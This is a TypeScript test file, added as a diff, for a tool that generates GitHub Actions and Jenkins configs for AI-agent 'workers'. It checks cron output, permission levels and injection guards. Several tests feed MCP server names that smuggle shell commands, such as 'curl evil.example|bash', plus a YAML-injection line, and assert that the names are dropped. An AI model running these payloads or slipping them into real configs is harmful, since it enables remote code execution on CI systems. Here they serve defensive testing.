@@ -1,0 +1,290 @@
+import { describe, expect, it } from 'vitest';
+
+import type { Flow } from './schema';
+import type { Worker } from './worker';
+import { buildCiDeploy, ciPermissions, cronFromCadence } from './ciDeploy';
+
+function flow(id: string, backend: Flow['participants'][number]['backend'] = 'claude'): Flow {
+  return {
+    id,
+    name: `Flow ${id}`,
+    input: 'user_prompt',
+    participants: [{ id: 'primary', name: 'Sonnet', backend, model: 'claude-sonnet-4-6', kind: 'primary' }],
+    steps: [
+      { id: 'step_1', participantId: 'primary', role: 'planner', inputs: ['user_prompt'], tools: [], output: 'plan.md' },
+    ],
+    source: 'user',
+    filePath: `/tmp/${id}.yaml`,
+  };
+}
+
+function worker(overrides: Partial<Worker> = {}): Worker {
+  return {
+    id: 'w1',
+    name: 'Release Nanny',
+    jobDescription: 'Watch the release branch every morning and report what is not green.',
+    projectPath: '/repo',
+    cadence: { kind: 'daily', time: '09:00' },
+    trust: 'trusted',
+    caps: { maxItemsPerShift: 3, runIn: 'worktree' },
+    budgetUSDPerMonth: 12,
+    heartbeatModel: 'claude-sonnet-4-6',
+    flowIds: ['nightly-review'],
+    enabled: true,
+    createdAt: 1,
+    ...overrides,
+  };
+}
+
+describe('cronFromCadence', () => {
+  it('renders a daily cadence', () => {
+    expect(cronFromCadence({ kind: 'daily', time: '09:00', days: [1, 2, 3, 4, 5] })).toBe('0 9 * * 1,2,3,4,5');
+  });
+
+  it('renders a sub-hour interval', () => {
+    expect(cronFromCadence({ kind: 'interval', everyMinutes: 30 })).toBe('*/30 * * * *');
+  });
+
+  it('renders an hours-or-more interval with a window', () => {
+    expect(
+      cronFromCadence({ kind: 'interval', everyMinutes: 120, window: { start: '08:00', end: '17:00' } }),
+    ).toBe('0 8-17/2 * * *');
+  });
+
+  it('is null for on demand', () => {
+    expect(cronFromCadence(null)).toBeNull();
+  });
+
+  it('splits a window that wraps midnight into two ranges', () => {
+    expect(
+      cronFromCadence({ kind: 'interval', everyMinutes: 15, window: { start: '22:00', end: '02:00' } }),
+    ).toBe('*/15 22-23,0-2 * * *');
+  });
+
+  it('splits a wrapping window on the hours-or-more path too', () => {
+    expect(
+      cronFromCadence({ kind: 'interval', everyMinutes: 120, window: { start: '22:00', end: '02:00' } }),
+    ).toBe('0 22-23,0-2/2 * * *');
+  });
+});
+
+describe('ciPermissions', () => {
+  it('denies everything for a probationary worker', () => {
+    expect(ciPermissions(worker({ trust: 'probation' }))).toBe('deny');
+  });
+
+  it('allows the allow-list for an autonomous worker', () => {
+    expect(
+      ciPermissions(worker({ trust: 'autonomous', caps: { maxItemsPerShift: 3, runIn: 'cwd', allowExternalActions: true } })),
+    ).toBe('allow-list');
+  });
+});
+
+describe('buildCiDeploy', () => {
+  it('produces the bundle and a GitHub Actions workflow', () => {
+    const plan = buildCiDeploy({
+      worker: worker({ cadence: { kind: 'daily', time: '09:00', days: [1, 2, 3, 4, 5] } }),
+      flows: [flow('nightly-review')],
+      target: 'github',
+      workerYaml: 'name: Release Nanny\n',
+    });
+    expect(plan.files.map((f) => f.path)).toEqual([
+      '.overcli/workers/release-nanny.worker.yaml',
+      '.github/workflows/overcli-release-nanny.yml',
+    ]);
+    const workflow = plan.files[1].contents;
+    expect(workflow).toContain('workflow_dispatch:');
+    expect(workflow).toContain('cron: "0 9 * * 1,2,3,4,5"');
+  });
+
+  it('produces a Jenkinsfile', () => {
+    const plan = buildCiDeploy({
+      worker: worker(),
+      flows: [flow('nightly-review')],
+      target: 'jenkins',
+      workerYaml: 'name: Release Nanny\n',
+    });
+    const jenkinsfile = plan.files[1].contents;
+    expect(jenkinsfile).toContain('disableConcurrentBuilds()');
+    expect(jenkinsfile).toContain('archiveArtifacts');
+  });
+
+  it('installs the backend CLI package in the Jenkins Setup stage', () => {
+    const plan = buildCiDeploy({
+      worker: worker(),
+      flows: [flow('nightly-review', 'claude')],
+      target: 'jenkins',
+      workerYaml: 'name: Release Nanny\n',
+    });
+    const jenkinsfile = plan.files[1].contents;
+    expect(jenkinsfile).toContain('@anthropic-ai/claude-code');
+  });
+
+  it('falls back to installing claude when every backend is Ollama', () => {
+    const plan = buildCiDeploy({
+      worker: worker({ heartbeatBackend: 'ollama' }),
+      flows: [flow('nightly-review', 'ollama')],
+      target: 'github',
+      workerYaml: 'name: Release Nanny\n',
+    });
+    const workflow = plan.files[1].contents;
+    expect(workflow).toContain('backends: claude');
+  });
+
+  it('never emits auto-approve, and a probationary worker gets deny', () => {
+    const plan = buildCiDeploy({
+      worker: worker({ trust: 'probation' }),
+      flows: [flow('nightly-review')],
+      target: 'github',
+      workerYaml: 'name: Release Nanny\n',
+    });
+    const workflow = plan.files[1].contents;
+    expect(workflow).toContain('--permissions deny');
+    expect(workflow).not.toContain('auto-approve');
+  });
+
+  it('warns when a flow runs on Ollama', () => {
+    const plan = buildCiDeploy({
+      worker: worker(),
+      flows: [flow('nightly-review', 'ollama')],
+      target: 'github',
+      workerYaml: 'name: Release Nanny\n',
+    });
+    expect(plan.warnings.some((w) => w.includes('Ollama'))).toBe(true);
+  });
+});
+
+describe('trust and the allow-list', () => {
+  it('carries the worker’s trust into the job, since the bundle cannot', () => {
+    const plan = buildCiDeploy({
+      worker: worker({ trust: 'autonomous' }),
+      flows: [flow('nightly-review')],
+      target: 'github',
+      workerYaml: 'x',
+    });
+    expect(plan.files[1].contents).toContain('--trust autonomous');
+  });
+
+  it('warns that a probationary worker will do nothing in CI', () => {
+    const plan = buildCiDeploy({
+      worker: worker({ trust: 'probation' }),
+      flows: [flow('nightly-review')],
+      target: 'github',
+      workerYaml: 'x',
+    });
+    expect(plan.warnings.some((w) => w.includes('probation'))).toBe(true);
+  });
+
+  it('seeds a read-only allow-list, because allow-list with no tools is just deny', () => {
+    const plan = buildCiDeploy({
+      worker: worker({ trust: 'trusted' }),
+      flows: [flow('nightly-review')],
+      target: 'jenkins',
+      workerYaml: 'x',
+    });
+    expect(plan.files[1].contents).toContain('--allow-tool Read,Grep,Glob');
+    expect(plan.checklist.some((c) => c.includes('Read, Grep, Glob'))).toBe(true);
+  });
+
+  it('omits the allow-list entirely under deny, where it would mean nothing', () => {
+    const plan = buildCiDeploy({
+      worker: worker({ trust: 'probation' }),
+      flows: [flow('nightly-review')],
+      target: 'github',
+      workerYaml: 'x',
+    });
+    expect(plan.files[1].contents).not.toContain('--allow-tool');
+  });
+
+  it('installs the backend CLI package in the Jenkins Setup stage', () => {
+    const plan = buildCiDeploy({
+      worker: worker(),
+      flows: [flow('nightly-review', 'gemini')],
+      target: 'jenkins',
+      workerYaml: 'x',
+    });
+    expect(plan.files[1].contents).toContain('@anthropic-ai/claude-code');
+    expect(plan.files[1].contents).toContain('@google/gemini-cli');
+  });
+});
+
+describe('MCP names are attacker-controlled text, not shell', () => {
+  const evil = (name: string) =>
+    buildCiDeploy({
+      worker: worker({ trust: 'trusted', mcpServers: [name] }),
+      flows: [flow('nightly-review')],
+      target: 'jenkins',
+      workerYaml: 'x',
+    });
+
+  it('drops a name that would close the Groovy string and run a command', () => {
+    const plan = evil("jira'; sh 'curl evil.example|bash");
+    expect(plan.files[1].contents).not.toContain('curl evil.example');
+    expect(plan.warnings.some((w) => w.includes('Dropped'))).toBe(true);
+  });
+
+  it('drops a name carrying a shell separator', () => {
+    expect(evil('jira; curl evil.example | bash').files[1].contents).not.toContain('curl');
+  });
+
+  it('drops a name with a newline, which would inject YAML keys', () => {
+    const plan = buildCiDeploy({
+      worker: worker({ trust: 'trusted', mcpServers: ['jira\n      - run: whoami'] }),
+      flows: [flow('nightly-review')],
+      target: 'github',
+      workerYaml: 'x',
+    });
+    expect(plan.files[1].contents).not.toContain('whoami');
+  });
+
+  it('keeps ordinary names, so the guard costs nothing legitimate', () => {
+    const plan = buildCiDeploy({
+      worker: worker({ trust: 'trusted', mcpServers: ['github', 'atlassian-rovo', 'my.server_1'] }),
+      flows: [flow('nightly-review')],
+      target: 'jenkins',
+      workerYaml: 'x',
+    });
+    expect(plan.files[1].contents).toContain('--mcp github atlassian-rovo my.server_1');
+    expect(plan.warnings.some((w) => w.includes('Dropped'))).toBe(false);
+  });
+
+  it('names the dropped entries rather than silently swallowing them', () => {
+    expect(evil("a'; bash").warnings.join(' ')).toContain('a\'; bash');
+  });
+});
+
+describe('worker instructions are target-aware', () => {
+  it('does not tell a Jenkins user to create a repository secret', () => {
+    const plan = buildCiDeploy({
+      worker: worker({ trust: 'trusted', mcpServers: ['github'] }),
+      flows: [flow('nightly-review')],
+      target: 'jenkins',
+      workerYaml: 'x',
+    });
+    expect(plan.checklist.join(' ')).not.toContain('repository secret');
+    expect(plan.checklist.join(' ')).toContain('Manage Jenkins');
+  });
+
+  it('does not tell a GitHub user about the agent timezone', () => {
+    const plan = buildCiDeploy({
+      worker: worker({ trust: 'trusted' }),
+      flows: [flow('nightly-review')],
+      target: 'github',
+      workerYaml: 'x',
+    });
+    expect(plan.checklist.join(' ')).toContain('UTC');
+    expect(plan.checklist.join(' ')).not.toContain('agent');
+  });
+
+  it('warns that the CLI is not published, on both targets', () => {
+    for (const target of ['github', 'jenkins'] as const) {
+      const plan = buildCiDeploy({
+        worker: worker({ trust: 'trusted' }),
+        flows: [flow('nightly-review')],
+        target,
+        workerYaml: 'x',
+      });
+      expect(plan.warnings.some((w) => w.includes('not published yet'))).toBe(true);
+    }
+  });
+});
